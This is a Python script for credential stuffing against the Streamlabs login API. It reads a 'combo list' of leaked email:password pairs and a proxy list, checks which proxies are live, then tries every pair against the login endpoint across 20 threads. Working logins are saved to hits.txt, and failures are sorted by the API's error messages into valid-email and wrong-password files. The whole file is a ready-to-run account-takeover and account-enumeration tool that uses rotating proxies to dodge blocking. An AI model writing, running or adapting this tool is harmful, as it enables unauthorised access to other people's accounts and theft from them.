import requests
import threading
from queue import Queue
import concurrent.futures

# Global variables
valid_proxies = []
proxy_lock = threading.Lock()
checked_accounts = set()  # Initialize a set to store checked credentials
writingfilepath = "hits.txt"
login_url = "https://api-id.streamlabs.com/v1/auth/login"

# Function to ask the user for the proxy type
def get_proxy_type():
    proxy_type = input("Enter proxy type (http, https, socks5, socks4): ").strip().lower()
    while proxy_type not in ["http", "https", "socks5", "socks4"]:
        print("Invalid proxy type. Please choose from: http, https, socks5, socks4.")
        proxy_type = input("Enter proxy type (http, https, socks5, socks4): ").strip().lower()
    return proxy_type

# Function to test a single proxy
def check_proxy(proxy, proxy_type, q):
    try:
        # Remove any existing scheme from the proxy string
        if proxy.startswith("http://"):
            proxy = proxy[len("http://"):]
        elif proxy.startswith("https://"):
            proxy = proxy[len("https://"):]
        elif proxy.startswith("socks5://"):
            proxy = proxy[len("socks5://"):]
        elif proxy.startswith("socks4://"):
            proxy = proxy[len("socks4://"):]

        # Now construct the proxy URL
        proxy_url = f"{proxy_type}://{proxy}"
        response = requests.get("https://streamlabs.com", proxies={"http": proxy_url, "https": proxy_url}, timeout=5)
        if response.status_code == 200:
            with proxy_lock:
                valid_proxies.append(proxy_url)
            q.put(f"[VALID] Proxy: {proxy_url}")
        else:
            q.put(f"[INVALID] Proxy: {proxy_url} - Status Code: {response.status_code}")
    except requests.exceptions.RequestException:
        q.put(f"[INVALID] Proxy: {proxy} - Error")

# Function to check proxies from the list
def check_all_proxies(proxy_list, proxy_type):
    q = Queue()
    threads = []

    for proxy in proxy_list:
        thread = threading.Thread(target=check_proxy, args=(proxy, proxy_type, q))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    while not q.empty():
        print(q.get())

    # Return valid proxies after checking
    return valid_proxies

# Function to read proxies from a file
def read_proxies(filename):
    with open(filename, "r") as file:
        proxies = file.readlines()
    return [proxy.strip() for proxy in proxies]

def check_account(email, password, proxy, proxy_type):
    payload = {"email": email, "password": password}
    
    # Remove any existing scheme from the proxy string
    if proxy.startswith("http://"):
        proxy = proxy[len("http://"):]
    elif proxy.startswith("https://"):
        proxy = proxy[len("https://"):]
    elif proxy.startswith("socks5://"):
        proxy = proxy[len("socks5://"):]
    elif proxy.startswith("socks4://"):
        proxy = proxy[len("socks4://"):]

    # Construct the proxy URL
    proxy_url = f"{proxy_type}://{proxy}"
    proxies = {"http": proxy_url, "https": proxy_url}

    try:
        if (email, password) in checked_accounts:
            print(f"Skipping already checked account: {email}")
        else:
            response = requests.post(login_url, json=payload, proxies=proxies, timeout=5)
            
            if response.status_code == 200:
                print(f"[SUCCESS] Email: {email}, Password: {password} using Proxy: {proxy_url}")
                with open("hits.txt", 'a') as f:  # 'a' for appending
                    f.write(email + ':' + password + '\n')
                checked_accounts.add((email, password))  # Mark this account as checked
            else:
                response_data = response.json()
                message = response_data.get("message", "")
                errors = response_data.get("errors", {})
                
                if "email" in errors:
                    print(f"[INVALID EMAIL] Email: {email} - Error Message: {message} using Proxy: {proxy_url}")
                    with open("Valid_email.txt", 'a') as f:  # 'a' for appending
                        f.write(email + ':' + password + '\n')
                elif "password" in errors:
                    print(f"[INVALID PASSWORD] Email: {email} - Error Message: {message} using Proxy: {proxy_url}")
                    with open("invalid.txt", 'a') as f:  # 'a' for appending
                        f.write(email + ':' + password + '\n')
                else:
                    print(f"[UNEXPECTED RESPONSE] Email: {email} - Status Code: {response.status_code} using Proxy: {proxy_url}")
                    print(f"Response Body: {response.text}")
                checked_accounts.add((email, password))  # Mark this account as checked even on failure
        
    except requests.exceptions.RequestException as e:
        if 'Connection' in str(e):
            print(f"[ERROR] Email: {email} - Error with Proxy: {proxy_url} (Connection Issue)")
        else:
            print(f"[ERROR] Email: {email} - Error with Proxy: {proxy_url} (Request Exception: {e})")

# Function to read credentials from a file
def read_credentials(filename):
    with open(filename, "r") as file:
        credentials = file.readlines()
    return [tuple(cred.strip().split(':')) for cred in credentials]

def process_account_batch(credentials_batch, proxies, proxy_type):
    for email, password in credentials_batch:
        for proxy in proxies:
            check_account(email, password, proxy, proxy_type)

def main():
    proxy_type = get_proxy_type()  # Ask user for proxy type
    proxy_filename = input("Path to proxy list: ")  # Text file containing proxies
    credentials_filename = input("Path to combo list: ")  # Text file containing email:password pairs
    
    # Read proxies and check their validity
    proxy_list = read_proxies(proxy_filename)
    valid_proxies = check_all_proxies(proxy_list, proxy_type)
    
    if valid_proxies:
        # Read credentials
        credentials = read_credentials(credentials_filename)

        # Batch size (can be adjusted based on performance)
        batch_size = 10
        batches = [credentials[i:i + batch_size] for i in range(0, len(credentials), batch_size)]

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for batch in batches:
                futures.append(executor.submit(process_account_batch, batch, valid_proxies, proxy_type))
            concurrent.futures.wait(futures)

    else:
        print("No valid proxies available to check accounts.")

if __name__ == "__main__":
    main()
